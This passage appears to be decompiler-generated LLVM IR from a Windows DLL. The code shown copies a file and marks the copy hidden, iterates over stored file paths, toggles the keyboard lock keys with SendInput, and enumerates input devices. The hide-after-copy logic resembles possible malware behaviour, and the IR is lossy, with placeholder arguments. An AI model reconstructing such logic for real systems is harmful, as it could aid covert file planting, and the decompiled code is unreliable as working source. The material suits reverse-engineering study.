  %eax.2.reg2mem = alloca i32, !insn.addr !1623
  %eax.1.reg2mem = alloca i32, !insn.addr !1623
  %ecx.0.reg2mem = alloca i32, !insn.addr !1623
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-44 = alloca i8, align 1
  %2 = call i8 @__decompiler_undefined_function_4()
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-16 = alloca i32, align 4
  %3 = call i32 @__readfsdword(i32 0), !insn.addr !1624
  store i32 %3, i32* %stack_var_-16, align 4, !insn.addr !1625
  %4 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1626
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1627
  %5 = call i32 @function_10017f90(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_100392e0, i32 0, i32 0)), !insn.addr !1628
  store i8 0, i8* %stack_var_-68, align 1, !insn.addr !1629
  store i32 %5, i32* %ecx.0.reg2mem, !insn.addr !1630
  br label %dec_label_pc_10003c63, !insn.addr !1630

dec_label_pc_10003c63:                            ; preds = %dec_label_pc_10003c63, %dec_label_pc_10003c10
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %6 = inttoptr i32 %ecx.0.reload to i8*, !insn.addr !1631
  %7 = load i8, i8* %6, align 1, !insn.addr !1631
  %8 = add i32 %ecx.0.reload, 1, !insn.addr !1632
  %9 = icmp eq i8 %7, 0, !insn.addr !1633
  %10 = icmp eq i1 %9, false, !insn.addr !1634
  store i32 %8, i32* %ecx.0.reg2mem, !insn.addr !1634
  br i1 %10, label %dec_label_pc_10003c63, label %dec_label_pc_10003c6a, !insn.addr !1634

dec_label_pc_10003c6a:                            ; preds = %dec_label_pc_10003c63
  %11 = sub i32 %ecx.0.reload, %5, !insn.addr !1635
  %12 = call i32 @function_10005030(i32 %5, i32 %11), !insn.addr !1636
  %13 = bitcast i8* %stack_var_-68 to i32*, !insn.addr !1637
  %14 = call i32 @function_10006730(i32* nonnull %13), !insn.addr !1637
  %15 = ptrtoint i8* %stack_var_-44 to i32, !insn.addr !1638
  %16 = icmp ult i32 %1, 16, !insn.addr !1639
  %17 = icmp eq i1 %16, false, !insn.addr !1640
  %18 = sext i8 %2 to i32, !insn.addr !1640
  %19 = select i1 %17, i32 %18, i32 %15, !insn.addr !1640
  %20 = inttoptr i32 %0 to i8*, !insn.addr !1641
  %21 = call i1 @SetFileAttributesA(i8* %20, i32 128), !insn.addr !1642
  %22 = inttoptr i32 %19 to i8*, !insn.addr !1643
  %23 = call i1 @CopyFileA(i8* %22, i8* %20, i1 false), !insn.addr !1644
  %24 = call i1 @SetFileAttributesA(i8* %20, i32 4), !insn.addr !1645
  %25 = call i32 @GetLastError(), !insn.addr !1646
  %26 = call i32 @function_10006af0(i32 %25), !insn.addr !1647
  br i1 %16, label %dec_label_pc_10003d17, label %dec_label_pc_10003cd5, !insn.addr !1648

dec_label_pc_10003cd5:                            ; preds = %dec_label_pc_10003c6a
  %27 = load i8, i8* %stack_var_-44, align 1, !insn.addr !1649
  %28 = sext i8 %27 to i32, !insn.addr !1649
  %29 = add i32 %1, 1, !insn.addr !1650
  %30 = icmp ult i32 %29, 4096, !insn.addr !1651
  store i32 %28, i32* %ecx.1.reg2mem, !insn.addr !1652
  br i1 %30, label %dec_label_pc_10003d0e, label %dec_label_pc_10003ce0, !insn.addr !1652

dec_label_pc_10003ce0:                            ; preds = %dec_label_pc_10003cd5
  %31 = and i32 %28, 31
  %32 = icmp eq i32 %31, 0, !insn.addr !1653
  br i1 %32, label %dec_label_pc_10003cea, label %dec_label_pc_10003ce5, !insn.addr !1654

dec_label_pc_10003ce5:                            ; preds = %dec_label_pc_10003ce0
  %33 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1655
  br label %dec_label_pc_10003cea, !insn.addr !1655

dec_label_pc_10003cea:                            ; preds = %dec_label_pc_10003ce5, %dec_label_pc_10003ce0
  %34 = add nsw i32 %28, -4, !insn.addr !1656
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1656
  %36 = load i32, i32* %35, align 4, !insn.addr !1656
  %37 = icmp ult i32 %36, %28, !insn.addr !1657
  store i32 %36, i32* %eax.1.reg2mem, !insn.addr !1658
  br i1 %37, label %dec_label_pc_10003cf6, label %dec_label_pc_10003cf1, !insn.addr !1658

dec_label_pc_10003cf1:                            ; preds = %dec_label_pc_10003cea
  %38 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1659
  store i32 %38, i32* %eax.1.reg2mem, !insn.addr !1659
  br label %dec_label_pc_10003cf6, !insn.addr !1659

dec_label_pc_10003cf6:                            ; preds = %dec_label_pc_10003cf1, %dec_label_pc_10003cea
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %39 = sub i32 %28, %eax.1.reload, !insn.addr !1660
  %40 = icmp ult i32 %39, 4, !insn.addr !1661
  %41 = icmp eq i1 %40, false, !insn.addr !1662
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !1662
  br i1 %41, label %dec_label_pc_10003d02, label %dec_label_pc_10003cfd, !insn.addr !1662

dec_label_pc_10003cfd:                            ; preds = %dec_label_pc_10003cf6
  %42 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1663
  store i32 %42, i32* %eax.2.reg2mem, !insn.addr !1663
  br label %dec_label_pc_10003d02, !insn.addr !1663

dec_label_pc_10003d02:                            ; preds = %dec_label_pc_10003cfd, %dec_label_pc_10003cf6
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  %43 = icmp ult i32 %39, 36
  store i32 %eax.2.reload, i32* %ecx.1.reg2mem, !insn.addr !1664
  br i1 %43, label %dec_label_pc_10003d0e, label %dec_label_pc_10003d07, !insn.addr !1664

dec_label_pc_10003d07:                            ; preds = %dec_label_pc_10003d02
  %44 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1665
  store i32 %44, i32* %ecx.1.reg2mem, !insn.addr !1665
  br label %dec_label_pc_10003d0e, !insn.addr !1665

dec_label_pc_10003d0e:                            ; preds = %dec_label_pc_10003d02, %dec_label_pc_10003d07, %dec_label_pc_10003cd5
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %45 = inttoptr i32 %ecx.1.reload to i32*, !insn.addr !1666
  call void @_free(i32* %45), !insn.addr !1666
  br label %dec_label_pc_10003d17, !insn.addr !1667

dec_label_pc_10003d17:                            ; preds = %dec_label_pc_10003d0e, %dec_label_pc_10003c6a
  store i8 0, i8* %stack_var_-44, align 1, !insn.addr !1668
  %46 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1669
  call void @__writefsdword(i32 0, i32 %46), !insn.addr !1670
  %47 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1671
  ret i32 %47, !insn.addr !1672
}

define i32 @function_10003d90() local_unnamed_addr {
dec_label_pc_10003d90:
  %eax.2.reg2mem = alloca i32, !insn.addr !1673
  %eax.1.reg2mem = alloca i32, !insn.addr !1673
  %eax.0.reg2mem = alloca i32, !insn.addr !1673
  %ecx.1.reg2mem = alloca i32, !insn.addr !1673
  %.pre-phi.reg2mem = alloca i32, !insn.addr !1673
  %ecx.0.reg2mem = alloca i32, !insn.addr !1673
  %ebx.0.reg2mem = alloca i32, !insn.addr !1673
  %stack_var_-264.0.reg2mem = alloca i32, !insn.addr !1673
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-260 = alloca i8, align 1
  %stack_var_-356 = alloca i8*, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1674
  store i32 %1, i32* %stack_var_-16, align 4, !insn.addr !1675
  %2 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1676
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1677
  store i32 0, i32* %stack_var_-212, align 4, !insn.addr !1678
  %3 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_100392f4 to i32), i32 1), !insn.addr !1679
  %4 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_100392f8 to i32), i32 1), !insn.addr !1680
  %5 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_100392fc to i32), i32 1), !insn.addr !1681
  %6 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_10039300 to i32), i32 1), !insn.addr !1682
  %7 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_10039304 to i32), i32 1), !insn.addr !1683
  %8 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_10039308 to i32), i32 1), !insn.addr !1684
  %9 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_1003930c to i32), i32 1), !insn.addr !1685
  %10 = call i32 @function_10005030(i32 ptrtoint (i32* @global_var_10039310 to i32), i32 1), !insn.addr !1686
  store i8* getelementptr inbounds ([35 x i8], [35 x i8]* @global_var_100392b8, i32 0, i32 0), i8** %stack_var_-356, align 4, !insn.addr !1687
  %11 = ptrtoint i8** %stack_var_-356 to i32, !insn.addr !1687
  store i32 0, i32* %stack_var_-236, align 4, !insn.addr !1688
  %12 = call i32 @function_10005030(i32 ptrtoint ([35 x i8]* @global_var_100392b8 to i32), i32 34), !insn.addr !1689
  %13 = ptrtoint i32* %stack_var_-212 to i32, !insn.addr !1690
  %14 = add i32 %11, -4, !insn.addr !1691
  %15 = inttoptr i32 %14 to i32*
  %16 = ptrtoint i32* %stack_var_-236 to i32, !insn.addr !1691
  %17 = ptrtoint i8* %stack_var_-260 to i32
  %18 = icmp ult i32 %0, 16
  %19 = icmp eq i1 %18, false
  %20 = add i32 %11, -8
  %21 = inttoptr i32 %20 to i32*
  %22 = add i32 %11, -12
  %23 = inttoptr i32 %22 to i32*
  %24 = add i32 %0, 1
  %25 = icmp ult i32 %24, 4096
  store i32 %13, i32* %stack_var_-264.0.reg2mem, !insn.addr !1692
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1692
  br label %dec_label_pc_10003f55, !insn.addr !1692

dec_label_pc_10003f55:                            ; preds = %dec_label_pc_1000403b, %dec_label_pc_10003d90
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %stack_var_-264.0.reload = load i32, i32* %stack_var_-264.0.reg2mem
  store i32 %16, i32* %15, align 4, !insn.addr !1691
  %26 = call i32 @function_10006ba0(i32 %stack_var_-264.0.reload), !insn.addr !1693
  store i32 ptrtoint ([3 x i8]* @global_var_100392dc to i32), i32* %15, align 4, !insn.addr !1694
  %27 = load i8, i8* %stack_var_-260, align 1, !insn.addr !1695
  %28 = sext i8 %27 to i32, !insn.addr !1695
  %29 = select i1 %19, i32 %28, i32 %17, !insn.addr !1695
  store i32 %29, i32* %21, align 4, !insn.addr !1696
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1697
  %31 = call %_IO_FILE* @_fopen(i8* %30, i8* bitcast (i32* @1 to i8*)), !insn.addr !1698
  %32 = icmp eq %_IO_FILE* %31, null, !insn.addr !1699
  br i1 %32, label %dec_label_pc_10003ffb, label %dec_label_pc_10003f9e, !insn.addr !1700

dec_label_pc_10003f9e:                            ; preds = %dec_label_pc_10003f55
  %33 = ptrtoint %_IO_FILE* %31 to i32, !insn.addr !1698
  store i32 2, i32* %15, align 4, !insn.addr !1701
  store i32 0, i32* %21, align 4, !insn.addr !1702
  store i32 %33, i32* %23, align 4, !insn.addr !1703
  %34 = call i32 @_fseek(%_IO_FILE* bitcast (i32* @1 to %_IO_FILE*), i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1704
  store i32 %33, i32* %15, align 4, !insn.addr !1705
  %35 = icmp eq i32 %34, 0, !insn.addr !1706
  br i1 %35, label %dec_label_pc_10003fba, label %dec_label_pc_10003fb0, !insn.addr !1707

dec_label_pc_10003fb0:                            ; preds = %dec_label_pc_10003f9e
  %36 = call i32 @_fclose(%_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !1708
  br label %dec_label_pc_10003ffb, !insn.addr !1709

dec_label_pc_10003fba:                            ; preds = %dec_label_pc_10003f9e
  %37 = call i32 @function_1001560d(), !insn.addr !1710
  store i32 %33, i32* %15, align 4, !insn.addr !1711
  %38 = call i32 @_fclose(%_IO_FILE* bitcast (i32* @1 to %_IO_FILE*)), !insn.addr !1712
  %39 = add i32 %37, -1, !insn.addr !1713
  %40 = icmp ult i32 %39, 99999
  br i1 %40, label %dec_label_pc_10003fd7, label %dec_label_pc_10003ffb, !insn.addr !1714

dec_label_pc_10003fd7:                            ; preds = %dec_label_pc_10003fba
  %41 = call i32 @function_10006810(), !insn.addr !1715
  store i32 %41, i32* %15, align 4, !insn.addr !1716
  %42 = call i32 @function_10006af0(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1717
  %43 = call i32 @function_10003c10(), !insn.addr !1718
  br label %dec_label_pc_10003ffb, !insn.addr !1718

dec_label_pc_10003ffb:                            ; preds = %dec_label_pc_10003fd7, %dec_label_pc_10003fba, %dec_label_pc_10003fb0, %dec_label_pc_10003f55
  br i1 %18, label %dec_label_pc_1000403b, label %dec_label_pc_1000400a, !insn.addr !1719

dec_label_pc_1000400a:                            ; preds = %dec_label_pc_10003ffb
  %44 = load i8, i8* %stack_var_-260, align 1, !insn.addr !1720
  %45 = sext i8 %44 to i32, !insn.addr !1720
  store i32 %45, i32* %ecx.0.reg2mem, !insn.addr !1721
  br i1 %25, label %dec_label_pc_10004032, label %dec_label_pc_10004018, !insn.addr !1721

dec_label_pc_10004018:                            ; preds = %dec_label_pc_1000400a
  %46 = and i32 %45, 31
  %47 = icmp eq i32 %46, 0, !insn.addr !1722
  %48 = icmp eq i1 %47, false, !insn.addr !1723
  %.pre = add nsw i32 %45, -4
  store i32 %.pre, i32* %.pre-phi.reg2mem, !insn.addr !1723
  store i32 %45, i32* %ecx.1.reg2mem, !insn.addr !1723
  br i1 %48, label %dec_label_pc_10004070, label %dec_label_pc_1000401d, !insn.addr !1723

dec_label_pc_1000401d:                            ; preds = %dec_label_pc_10004018
  %49 = inttoptr i32 %.pre to i32*, !insn.addr !1724
  %50 = load i32, i32* %49, align 4, !insn.addr !1724
  %51 = icmp ult i32 %50, %45, !insn.addr !1725
  %52 = icmp eq i1 %51, false, !insn.addr !1726
  store i32 %.pre, i32* %.pre-phi.reg2mem, !insn.addr !1726
  store i32 %45, i32* %ecx.1.reg2mem, !insn.addr !1726
  br i1 %52, label %dec_label_pc_10004070, label %dec_label_pc_10004024, !insn.addr !1726

dec_label_pc_10004024:                            ; preds = %dec_label_pc_1000401d
  %53 = sub i32 %45, %50, !insn.addr !1727
  %.off = add i32 %53, -4
  %54 = icmp ult i32 %.off, 32
  store i32 %50, i32* %ecx.0.reg2mem, !insn.addr !1728
  store i32 %.off, i32* %.pre-phi.reg2mem, !insn.addr !1728
  store i32 %53, i32* %ecx.1.reg2mem, !insn.addr !1728
  br i1 %54, label %dec_label_pc_10004032, label %dec_label_pc_10004070, !insn.addr !1728

dec_label_pc_10004032:                            ; preds = %dec_label_pc_10004024, %dec_label_pc_1000400a
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  store i32 %ecx.0.reload, i32* %15, align 4, !insn.addr !1729
  call void @_free(i32* inttoptr (i32 8 to i32*)), !insn.addr !1730
  br label %dec_label_pc_1000403b, !insn.addr !1731

dec_label_pc_1000403b:                            ; preds = %dec_label_pc_10004032, %dec_label_pc_10003ffb
  %55 = add nuw nsw i32 %ebx.0.reload, 1, !insn.addr !1732
  %56 = add i32 %stack_var_-264.0.reload, 24, !insn.addr !1733
  %57 = icmp ult i32 %55, 8, !insn.addr !1734
  store i32 %56, i32* %stack_var_-264.0.reg2mem, !insn.addr !1734
  store i32 %55, i32* %ebx.0.reg2mem, !insn.addr !1734
  br i1 %57, label %dec_label_pc_10003f55, label %dec_label_pc_100040a2, !insn.addr !1734

dec_label_pc_10004070:                            ; preds = %dec_label_pc_10004018, %dec_label_pc_10004024, %dec_label_pc_1000401d
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %58 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1735
  %59 = inttoptr i32 %.pre-phi.reload to i32*, !insn.addr !1736
  %60 = load i32, i32* %59, align 4, !insn.addr !1736
  %61 = icmp ult i32 %60, %ecx.1.reload, !insn.addr !1737
  store i32 %60, i32* %eax.0.reg2mem, !insn.addr !1738
  br i1 %61, label %dec_label_pc_10004081, label %dec_label_pc_1000407c, !insn.addr !1738

dec_label_pc_1000407c:                            ; preds = %dec_label_pc_10004070
  %62 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1739
  store i32 %62, i32* %eax.0.reg2mem, !insn.addr !1739
  br label %dec_label_pc_10004081, !insn.addr !1739

dec_label_pc_10004081:                            ; preds = %dec_label_pc_1000407c, %dec_label_pc_10004070
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %63 = sub i32 %ecx.1.reload, %eax.0.reload, !insn.addr !1740
  %64 = icmp ult i32 %63, 4, !insn.addr !1741
  %65 = icmp eq i1 %64, false, !insn.addr !1742
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !1742
  br i1 %65, label %dec_label_pc_1000408d, label %dec_label_pc_10004088, !insn.addr !1742

dec_label_pc_10004088:                            ; preds = %dec_label_pc_10004081
  %66 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1743
  store i32 %66, i32* %eax.1.reg2mem, !insn.addr !1743
  br label %dec_label_pc_1000408d, !insn.addr !1743

dec_label_pc_1000408d:                            ; preds = %dec_label_pc_10004088, %dec_label_pc_10004081
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %67 = icmp ult i32 %63, 36
  store i32 %eax.1.reload, i32* %eax.2.reg2mem, !insn.addr !1744
  br i1 %67, label %dec_label_pc_10004099, label %dec_label_pc_10004092, !insn.addr !1744

dec_label_pc_10004092:                            ; preds = %dec_label_pc_1000408d
  %68 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !1745
  store i32 %68, i32* %eax.2.reg2mem, !insn.addr !1745
  br label %dec_label_pc_10004099, !insn.addr !1745

dec_label_pc_10004099:                            ; preds = %dec_label_pc_1000408d, %dec_label_pc_10004092
  %eax.2.reload = load i32, i32* %eax.2.reg2mem
  store i32 %eax.2.reload, i32* %15, align 4, !insn.addr !1746
  call void @_free(i32* nonnull @1), !insn.addr !1747
  br label %dec_label_pc_100040a2, !insn.addr !1748

dec_label_pc_100040a2:                            ; preds = %dec_label_pc_1000403b, %dec_label_pc_10004099
  store i32 268452912, i32* %15, align 4, !insn.addr !1749
  store i32 8, i32* %21, align 4, !insn.addr !1750
  store i32 24, i32* %23, align 4, !insn.addr !1751
  %69 = add i32 %11, -16, !insn.addr !1752
  %70 = inttoptr i32 %69 to i32*, !insn.addr !1752
  store i32 %13, i32* %70, align 4, !insn.addr !1752
  store i32 0, i32* %stack_var_-236, align 4, !insn.addr !1753
  %71 = call i32 @"??_M@YGXPAXIIP6EX0@Z@Z"(i32* null, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), void (i32*)* bitcast (i32* @1 to void (i32*)*)), !insn.addr !1754
  %72 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1755
  call void @__writefsdword(i32 0, i32 %72), !insn.addr !1756
  %73 = call i32 @"@__security_check_cookie@4"(), !insn.addr !1757
  ret i32 %73, !insn.addr !1758
}

define i32 @function_10004100() local_unnamed_addr {
dec_label_pc_10004100:
  %edi.0.reg2mem = alloca i32, !insn.addr !1759
  %esp.0.reg2mem = alloca i32, !insn.addr !1759
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4, !insn.addr !1760
  %0 = ptrtoint i32* %stack_var_-44 to i32, !insn.addr !1761
  %1 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %0, i32* %esp.0.reg2mem, !insn.addr !1762
  store i32 6, i32* %edi.0.reg2mem, !insn.addr !1762
  br label %dec_label_pc_10004130, !insn.addr !1762

dec_label_pc_10004130:                            ; preds = %dec_label_pc_10004130, %dec_label_pc_10004100
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %2 = add i32 %esp.0.reload, -4, !insn.addr !1763
  %3 = inttoptr i32 %2 to i32*, !insn.addr !1763
  store i32 500, i32* %3, align 4, !insn.addr !1763
  call void @Sleep(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1764
  %4 = add i32 %esp.0.reload, -8, !insn.addr !1765
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1765
  store i32 28, i32* %5, align 4, !insn.addr !1765
  %6 = add i32 %esp.0.reload, -12, !insn.addr !1766
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1766
  store i32 %1, i32* %7, align 4, !insn.addr !1766
  %8 = add i32 %esp.0.reload, -16, !insn.addr !1767
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1767
  store i32 1, i32* %9, align 4, !insn.addr !1767
  %10 = call i32 @SendInput(i32 20, %tagINPUT* null, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1768
  %11 = add i32 %esp.0.reload, -20, !insn.addr !1769
  %12 = inttoptr i32 %11 to i32*, !insn.addr !1769
  store i32 28, i32* %12, align 4, !insn.addr !1769
  %13 = add i32 %esp.0.reload, -24, !insn.addr !1770
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1770
  store i32 %1, i32* %14, align 4, !insn.addr !1770
  %15 = add i32 %esp.0.reload, -28, !insn.addr !1771
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1771
  store i32 1, i32* %16, align 4, !insn.addr !1771
  %17 = call i32 @SendInput(i32 2, %tagINPUT* bitcast (i32* @1 to %tagINPUT*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1772
  %18 = add i32 %esp.0.reload, -32, !insn.addr !1773
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1773
  store i32 28, i32* %19, align 4, !insn.addr !1773
  %20 = add i32 %esp.0.reload, -36, !insn.addr !1774
  %21 = inttoptr i32 %20 to i32*, !insn.addr !1774
  store i32 %1, i32* %21, align 4, !insn.addr !1774
  %22 = add i32 %esp.0.reload, -40, !insn.addr !1775
  %23 = inttoptr i32 %22 to i32*, !insn.addr !1775
  store i32 1, i32* %23, align 4, !insn.addr !1775
  %24 = call i32 @SendInput(i32 145, %tagINPUT* null, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1776
  %25 = add i32 %esp.0.reload, -44, !insn.addr !1777
  %26 = inttoptr i32 %25 to i32*, !insn.addr !1777
  store i32 28, i32* %26, align 4, !insn.addr !1777
  %27 = add i32 %esp.0.reload, -48, !insn.addr !1778
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1778
  store i32 %1, i32* %28, align 4, !insn.addr !1778
  %29 = add i32 %esp.0.reload, -52, !insn.addr !1779
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1779
  store i32 1, i32* %30, align 4, !insn.addr !1779
  %31 = call i32 @SendInput(i32 2, %tagINPUT* bitcast (i32* @1 to %tagINPUT*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1780
  %32 = add i32 %esp.0.reload, -56, !insn.addr !1781
  %33 = inttoptr i32 %32 to i32*, !insn.addr !1781
  store i32 28, i32* %33, align 4, !insn.addr !1781
  %34 = add i32 %esp.0.reload, -60, !insn.addr !1782
  %35 = inttoptr i32 %34 to i32*, !insn.addr !1782
  store i32 %1, i32* %35, align 4, !insn.addr !1782
  %36 = add i32 %esp.0.reload, -64, !insn.addr !1783
  %37 = inttoptr i32 %36 to i32*, !insn.addr !1783
  store i32 1, i32* %37, align 4, !insn.addr !1783
  %38 = call i32 @SendInput(i32 144, %tagINPUT* null, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1784
  %39 = add i32 %esp.0.reload, -68, !insn.addr !1785
  %40 = inttoptr i32 %39 to i32*, !insn.addr !1785
  store i32 28, i32* %40, align 4, !insn.addr !1785
  %41 = add i32 %esp.0.reload, -72, !insn.addr !1786
  %42 = inttoptr i32 %41 to i32*, !insn.addr !1786
  store i32 %1, i32* %42, align 4, !insn.addr !1786
  %43 = add i32 %esp.0.reload, -76, !insn.addr !1787
  %44 = inttoptr i32 %43 to i32*, !insn.addr !1787
  store i32 1, i32* %44, align 4, !insn.addr !1787
  %45 = call i32 @SendInput(i32 2, %tagINPUT* bitcast (i32* @1 to %tagINPUT*), i32 ptrtoint (i32* @1 to i32)), !insn.addr !1788
  %46 = add nsw i32 %edi.0.reload, -1, !insn.addr !1789
  %47 = icmp eq i32 %46, 0, !insn.addr !1789
  %48 = icmp eq i1 %47, false, !insn.addr !1790
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1790
  store i32 %46, i32* %edi.0.reg2mem, !insn.addr !1790
  br i1 %48, label %dec_label_pc_10004130, label %dec_label_pc_100041c1, !insn.addr !1790

dec_label_pc_100041c1:                            ; preds = %dec_label_pc_10004130
  ret i32 %45, !insn.addr !1791
}

define i32 @function_100041d0() local_unnamed_addr {
dec_label_pc_100041d0:
  %ebx.4.reg2mem = alloca i32, !insn.addr !1792
  %esi.2.reg2mem = alloca i32, !insn.addr !1792
  %esp.3.reg2mem = alloca i32, !insn.addr !1792
  %ebx.3.reg2mem = alloca i32, !insn.addr !1792
  %esi.1.reg2mem = alloca i32, !insn.addr !1792
  %ebx.2.reg2mem = alloca i32, !insn.addr !1792
  %edi.0.reg2mem = alloca i32, !insn.addr !1792
  %esi.0.reg2mem = alloca i32, !insn.addr !1792
  %esp.1.reg2mem = alloca i32, !insn.addr !1792
  %ebx.1.reg2mem = alloca i32, !insn.addr !1792
  %esp.0.reg2mem = alloca i32, !insn.addr !1792
  %ebx.0.reg2mem = alloca i32, !insn.addr !1792
  %stack_var_-72 = alloca i32, align 4
  %0 = call i32 @function_10006810(), !insn.addr !1793
  %1 = call i32 @function_10006af0(i32 %0), !insn.addr !1794
  %2 = ptrtoint i32* %stack_var_-72 to i32, !insn.addr !1795
  store i32 0, i32* %ebx.0.reg2mem, !insn.addr !1796
  store i32 %2, i32* %esp.0.reg2mem, !insn.addr !1796
  br label %dec_label_pc_100041f5, !insn.addr !1796

dec_label_pc_100041f5:                            ; preds = %dec_label_pc_1000431b, %dec_label_pc_100041d0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %3 = add i32 %esp.0.reload, 12, !insn.addr !1797
  %4 = add i32 %esp.0.reload, -4, !insn.addr !1798
  %5 = inttoptr i32 %4 to i32*, !insn.addr !1798
  store i32 8, i32* %5, align 4, !insn.addr !1798
  %6 = add i32 %esp.0.reload, -8, !insn.addr !1799
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1799
  store i32 %3, i32* %7, align 4, !insn.addr !1799
  %8 = add i32 %esp.0.reload, -12, !insn.addr !1800
  %9 = inttoptr i32 %8 to i32*, !insn.addr !1800
  store i32 0, i32* %9, align 4, !insn.addr !1800
  %10 = inttoptr i32 %3 to i32*, !insn.addr !1801
  store i32 0, i32* %10, align 4, !insn.addr !1801
  %11 = call i32 @GetRawInputDeviceList(%tagRAWINPUTDEVICELIST* bitcast (i32* @1 to %tagRAWINPUTDEVICELIST*), i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1802
  %12 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1803
  %13 = load i32, i32* %12, align 4, !insn.addr !1803
  %14 = mul i32 %13, 64, !insn.addr !1804
  %15 = and i32 %13, 469762048, !insn.addr !1805
  %16 = icmp eq i32 %15, 0, !insn.addr !1805
  %17 = select i1 %16, i32 %14, i32 -1, !insn.addr !1806
  %18 = add i32 %esp.0.reload, -16, !insn.addr !1807
  %19 = inttoptr i32 %18 to i32*, !insn.addr !1807
  store i32 %17, i32* %19, align 4, !insn.addr !1807
  %20 = call i32 @"??2@YAPAXI@Z"(i32 ptrtoint (i32* @1 to i32)), !insn.addr !1808
  store i32 %20, i32* %10, align 4, !insn.addr !1809
  store i32 8, i32* %19, align 4, !insn.addr !1810
  %21 = add i32 %esp.0.reload, -20, !insn.addr !1811
  %22 = inttoptr i32 %21 to i32*, !insn.addr !1811
  store i32 %esp.0.reload, i32* %22, align 4, !insn.addr !1811
  %23 = add i32 %esp.0.reload, -24, !insn.addr !1812
  %24 = inttoptr i32 %23 to i32*, !insn.addr !1812
  store i32 %20, i32* %24, align 4, !insn.addr !1812
  %25 = call i32 @GetRawInputDeviceList(%tagRAWINPUTDEVICELIST* bitcast (i32* @1 to %tagRAWINPUTDEVICELIST*), i32* nonnull @1, i32 ptrtoint (i32* @1 to i32)), !insn.addr !1813
  %26 = load i32, i32* %9, align 4, !insn.addr !1814
  %27 = icmp eq i32 %26, 0, !insn.addr !1814
  store i32 %ebx.0.reload, i32* %ebx.1.reg2mem, !insn.addr !1815
  store i32 %23, i32* %esp.1.reg2mem, !insn.addr !1815
  store i32 0, i32* %esi.0.reg2mem, !insn.addr !1815
  store i32 0, i32* %edi.0.reg2mem, !insn.addr !1815
  store i32 %ebx.0.reload, i32* %ebx.3.reg2mem, !insn.addr !1815
  store i32 %23, i32* %esp.3.reg2mem, !insn.addr !1815
  store i32 0, i32* %esi.2.reg2mem, !insn.addr !1815
  br i1 %27, label %dec_label_pc_100042fb, label %dec_label_pc_10004250, !insn.addr !1815

dec_label_pc_10004250:                            ; preds = %dec_label_pc_100041f5, %dec_label_pc_100042e4
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
